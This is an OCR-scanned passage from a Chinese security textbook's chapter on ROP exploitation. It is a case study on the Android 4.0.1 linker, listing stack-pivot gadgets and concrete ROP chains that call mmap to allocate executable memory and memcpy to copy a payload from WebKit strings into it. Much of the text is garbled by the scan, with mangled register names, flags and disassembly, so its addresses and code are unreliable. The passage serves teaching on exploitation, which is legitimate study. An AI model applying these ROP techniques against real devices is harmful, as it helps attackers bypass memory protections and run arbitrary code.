口跳转到0xb0002870时，r3、r4和r5寄存器的值会存储在栈顶上，然后sp、1r和pc
会从栈顶中的数据恢复。当r4指向用户控制的数据，r5指向有效代码（例如，漏洞场
景中的一个函数指针）时，这个gadget会很有用。
口放松上面儿种较为严格的要求，可以跳转到0xb000286c，并从r1指向的内存中加载sp、
1r和pc。这可以通过漏润让内存中已存在的对象中的指针指向用户控制的数据，并控
制第一个DWORD来实现，或者当r1指向的内存可以被用户完全控制时，sp就可以比
较可靠地从那里取得。这是一个特别有趣的gadget。编译器生成的代码在调用没有参数
的虚函数时，通常会将虚函数表指针存入r1。因为在这种情况下，需要伪造虚函数表来
---
## Page 253
9.3案例分析：Android4.0.1链接器237
控制pc，所以通过使用这个栈迁移的gadget，也有可能同时控制第一个双字（DWORD）
进面控制sp
口最后，当跳转到0xb0002868来使用整个函数作为栈迁移的gadget时，sp可以从r0指向
的内存加上0x34的偏移来载人。尽管这个偏移看起来很随机，但是在真实案例中却非常
有用。对于所有劫持的虚函数调用，r0会存储this指针，这样就可以通过成员变量来
控制偏移0x34处的数据
如果master gadget提供的儿种栈迁移方式都不适用，该函数调用点还提供了其他选项：
text:B0002348
ADD
text :B000234C
RO, SP, #0x24C
_d1_restore_core_regs
 text :B00023DC
ADD
R0, R4, #4
 text :B00023D4
BL
text :B00024F0
ADD
text:B00024F4
BL
R0, 85, #4
_dl_restore_core_regs
使用上面这些地址，你也可以通过解引用r4+0x38，r5+0x38以及当前栈下方的值来
加载sp
将栈顶指针指向任意用户控制的数据后，就可以构造足够长的ROP链，来分配可执行的内
存，然后将载荷复制进去，最后将控制流重定向到那里执行。
9.3.2在新映射内存中执行任意代码
现在已经控制了栈顶指针和栈上的数据，下面就可以通过提供一系列gadget地址来让它们依
次执行。因为链接器中提供的gadget是非常有限的，面且为每个载荷构造针对目标的ROP链相
当麻烦，所以需要使用通用的方法来分配一段可执行的内存，然后在那里执行原生代码。这种
ROP链通常被称作 ROP stager
我们的首要目标是分配可执行的内存，这样就能够在有XN保护的情况下执行任意代码。在
Linux上，内存页是通过mmap系统调用来分配的。幸运的是，链接器中包含了完整的Bionicmmap
实现，在例中位于0xb0001678。mmap函数需要6个参数。根据Android的 EABI标准，前4个
参数通过r0~r3来传递，最后两个通过栈来传递。因此，需要一个gadget将r0~r3初始化成
想要的值。一个可用的 gadget如下：
POP
(R0R4, PC)
利用这个gadget就可以实现传人任意参数调用mmap，这样我们就能够分配可执行的内存去
复制和执行原生代码。
然而，要注意到mmap函数执行之后，函数会返回1r指向的地址！所以有必要先把1r指向
一个gadget，来跳过栈中的两个参数，并在栈上重新加载pc。跳过栈上的8个字节可以通过弹
出数据到两个寄存器来实现，可以使用下面的Thumbgadget：
text :B0006544
POP
---
## Page 254
238
第9章ROP漏润利用技术
根据前面的介绍，可以在栈迁移的过程中将1r设置为0xb0006545。否则，必须在ROP链
的最前面完成这项工作。
尽管mmap通常会自己选择地址来分配内存，但是也提供了选项来支持固定地址内存的分配，
这使得ROP链的开发更加容易。mmap参数的更多细节可以在其帮助页面中找到。这里我们选择
的静态地址是0xb1008000，是链接器后面一段未使用的地址空间。第一部分的ROP链如下：
0xb00038ca
 pop (x0-r4,pe)
0xb0018000
 r1: size to allocate * one page
+ x0: static allocation target address
0x00001000
0x00000007
r2: protection = read,vrite execute
0x00000032
↓ r3: [1ag8 = MAP_ANON ∣ MAP_PRIVAT& | XAP_FIXED
Oxdeadbeef
· r4: don’t care
0xb0001678
 pc: _d1_mmap, returning to 1r = 0xb006545
0x00000000
 sixth parameter on stack: offset = 0
+ fifth parameter on stack: fd = -1
0xdeadc0de
· next gadget's address
mmap执行后，1r指向mmap自身，因为它调用了一个子函数，所以1r被设置成了调用子
函数之后的指令地址。这对于返回到1r的gadget（如mmap函数）非常重要。
这时候，要用来执行原生代码的内存被成功分配了，但是目前的数据都是0。下一步要把载
荷复制进这段内存，然后将执行转移过去。可以使用链接器内部的memcpy来复制内存；然面，
即便在劫持控制流的时候，有一个寄存器中存储了指向原生代码的指针，面现在寄存器中的值也
都已经被破坏了。当然，可以采用保存这个指针再复原的方法，但并不一定能成功。在这个案例
中，我们利用相邻WebKit string的特定属性来解决这个问题。
WebKit中代表string的数据结构中有一个指针指向真实的字符申数据。图9-7描绘了string
的数据结构。通过把ROP链分别放在两个string中，就有可能利用这个指针。第一部分的ROP链
可以弹出足够多的数据（指向第一个字符串），同时把string的数据指针存入一个寄存器，然后在
第二个字符串的数据中继续构造ROP链。图9-7展示了string头的各个字段如何被加载到寄存器。
把string指针存入r4是非常有用的，相当于在第一个string的结尾防止一个栈弹出的gadget。
这个gadget首先弹出堆头和string大小，并引用数到r0~r3中，然后把真正的字符串数据指针
放人r4。如果需要存人更高的寄存器，则可以在第一个字符串的结尾进行填充。另外还有两个
string头的元素需要跳过，所以采用的 gadget（又是一个Thumb gadget）如下所示：
, text :B0005914
POP
(R0-R6, PC)
当然mmap的其他参数也要设置好。首先，设置第一个参数r0，即内存复制的目标地址。
下面的gadget也能同时修复1r寄存器：
.text:B000131C
LDMPD
SP1, (R0, LR)
BX
LR
由于不用清理栈参数，所以1r只需要指向从栈恢复pc的gadget。接下来，r2必须存人内
存复制的长度。r3需要指向可写的内存。可以复用内存分配中的gadget。下一个gadget是：
---
## Page 255
9.3案例分析：Android4.0.1链接器
239
.text:B0001918
.text:B000191C
LDMFD
BX
LR
Dxb0005915
pop(r0-r6,pc}
r0
0
堆头部
rl
0x3023
r2
0x88
m_refCount
3
0x1802
m_length
0x910674
m_data8
r5
0
union
0
m_hashAndFlags
xdeadbeef
图9-7弹出 string头中的字段
注意，现在bx 1r等价于pop（pc）。r3指向有效内存，下面的Thumb gadget把r4存人
r1（r4中的是第二个字符串的内容指针）：
.text:B0006260
MOV
R1, R4
1oc_B0006268
.text:B0006268
STR
R1,[R3]
.text:B000626A
locret_B0006274
. text:B0006274
POP
(R4R7, PC)
第二部分的ROP链如下所示：
Oxb0005915
# pop over heap and string
er goes into r4
↓第二个字符串从此处开始
0xb000131c
 pop (r0, 1x) ; bx 1r
0xb0018000
●r0: copy destination = allocation address
0xb0002ab0
 1r: address of pop (pc)
0xb0001918
 pop [x2, r3, pc)
0x00001000
r2: copy length = one page
0xb0018000
r3: scratch menory - allocation address
---
## Page 256
240
第9章ROP漏润利用技术
0xb0006261
▪ r1 <- r4 ([r3] <- r4, pop (r4-r7))
Oxdeadbeef
 r4: don't care
0xdeadbeef
Oxdeadbeef
 r6: don't care
:Sx 
don′t care
Oxdeadbeef
 r7: don’t care
0xdeadc0de
 pc: next gadget's address
现在，memcpy的所有寄存器参数都设置好了，而且1r指向了pop（pc）指令.所以memcpy
可以正常返回。最后需要调用memcDy，然后跳转到代相应码中。复制完成后，可执行内存中包
含第二个字符串的完整内容，所以控制流跳转需要到ROP链的后面。这就导致跳转必须加上ROP